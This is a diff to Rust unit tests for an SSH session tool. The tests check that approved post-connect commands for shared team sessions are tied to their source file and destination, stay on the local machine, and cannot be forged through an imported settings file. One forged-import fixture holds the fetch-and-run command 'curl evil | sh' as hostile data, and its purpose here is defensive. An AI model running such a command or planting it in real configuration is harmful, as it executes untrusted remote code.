@@ -2663,6 +2663,18 @@ fn a_reset_keeps_the_mobaxterm_variables_and_an_export_carries_them() {
     assert!(read.ignored.is_empty(), "{:?}", read.ignored);
 }
 
+fn approval(
+    path: &str,
+    destination: &str,
+    steps: &[heimdall_core::post_connect::PostConnectStep],
+) -> heimdall_core::settings::SharedApproval {
+    heimdall_core::settings::SharedApproval {
+        source_path: path.to_owned(),
+        destination: destination.to_owned(),
+        steps: steps.to_vec(),
+    }
+}
+
 #[test]
 fn the_commands_approved_for_shared_sessions_are_kept_on_this_computer_never_exported_nor_imported()
 {
@@ -2673,29 +2685,45 @@ fn the_commands_approved_for_shared_sessions_are_kept_on_this_computer_never_exp
     let path = dir.path().join(SETTINGS_FILE_NAME);
     let id = ProfileId::new("shared-team-0123456789abcdef");
     let steps = vec![PostConnectStep::new("sudo -i")];
+    let given = approval("/srv/team.mxtsessions", "web|22|deploy", &steps);
     let mut settings = Settings::default();
-    assert!(!settings.shared_post_connect_approved(&id, &steps));
-    settings.approve_shared_post_connect(&id, &steps);
-    assert!(settings.shared_post_connect_approved(&id, &steps));
+    assert!(!settings.shared_post_connect_approved(&id, &given));
+    settings.approve_shared_post_connect(&id, given.clone());
+    assert!(settings.shared_post_connect_approved(&id, &given));
     // Approved as they are: another command, or the same one made to fail differently, is not.
-    assert!(!settings.shared_post_connect_approved(&id, &[PostConnectStep::new("sudo -s")]));
+    let other =
+        |steps: &[PostConnectStep]| approval("/srv/team.mxtsessions", "web|22|deploy", steps);
+    assert!(
+        !settings.shared_post_connect_approved(&id, &other(&[PostConnectStep::new("sudo -s")]))
+    );
     let mut stopping = steps.clone();
     stopping[0].on_failure = heimdall_core::post_connect::OnFailure::Stop;
-    assert!(!settings.shared_post_connect_approved(&id, &stopping));
-    assert!(!settings.shared_post_connect_approved(&ProfileId::new("shared-team-other"), &steps));
+    assert!(!settings.shared_post_connect_approved(&id, &other(&stopping)));
+    // Nor is the same command against another destination, or from another file.
+    assert!(!settings.shared_post_connect_approved(
+        &id,
+        &approval("/srv/team.mxtsessions", "evil|22|deploy", &steps)
+    ));
+    assert!(!settings.shared_post_connect_approved(
+        &id,
+        &approval("/srv/other.mxtsessions", "web|22|deploy", &steps)
+    ));
+    assert!(!settings.shared_post_connect_approved(&ProfileId::new("shared-team-other"), &given));
 
     settings.save(&path).expect("save");
     let read = Settings::load(&path).expect("load");
     assert_eq!(read, settings, "read back");
-    assert!(read.shared_post_connect_approved(&id, &steps));
+    assert!(read.shared_post_connect_approved(&id, &given));
 
     // An approval is this computer's own: an export leaves it behind, and a file cannot give one.
     let (text, _) = settings.export(None, true);
     assert!(!text.contains("shared-team-0123456789abcdef"), "{text}");
     let forged = format!(
         "{text}
-[settings.shared_approvals.post_connect]
-\"shared-team-0123456789abcdef\" = [{{ input = \"curl evil | sh\" }}]
+[settings.shared_approvals.post_connect.\"shared-team-0123456789abcdef\"]
+source_path = \"x\"
+destination = \"y\"
+steps = [{{ input = \"curl evil | sh\" }}]
 "
     );
     let imported = Settings::default().import(&forged).expect("read");
@@ -2708,7 +2736,7 @@ fn the_commands_approved_for_shared_sessions_are_kept_on_this_computer_never_exp
 }
 
 #[test]
-fn the_approvals_of_the_sessions_of_sources_no_longer_listed_are_forgotten() {
+fn the_approvals_of_sources_no_longer_listed_or_listed_for_another_file_are_forgotten() {
     use heimdall_core::post_connect::PostConnectStep;
     use heimdall_core::profile::ProfileId;
 
@@ -2717,13 +2745,14 @@ fn the_approvals_of_the_sessions_of_sources_no_longer_listed_are_forgotten() {
     for id in [
         "shared-team-0011",
         "shared-gone-0022",
-        "shared-gone-0033",
+        "shared-moved-0033",
         "not-shared",
     ] {
-        settings.approve_shared_post_connect(&ProfileId::new(id), &steps);
+        settings.approve_shared_post_connect(&ProfileId::new(id), approval("/a", "d", &steps));
     }
+    let kept = [("team", "/a"), ("moved", "/elsewhere")];
     assert_eq!(
-        settings.forget_shared_post_connect_approvals_except(&["team"]),
+        settings.forget_shared_post_connect_approvals_except(&kept),
         2
     );
     let left: Vec<&str> = settings
@@ -2734,7 +2763,7 @@ fn the_approvals_of_the_sessions_of_sources_no_longer_listed_are_forgotten() {
     // A key that names no source is left alone, as the C# does.
     assert_eq!(left, ["not-shared", "shared-team-0011"]);
     assert_eq!(
-        settings.forget_shared_post_connect_approvals_except(&["team"]),
+        settings.forget_shared_post_connect_approvals_except(&kept),
         0
     );
 }
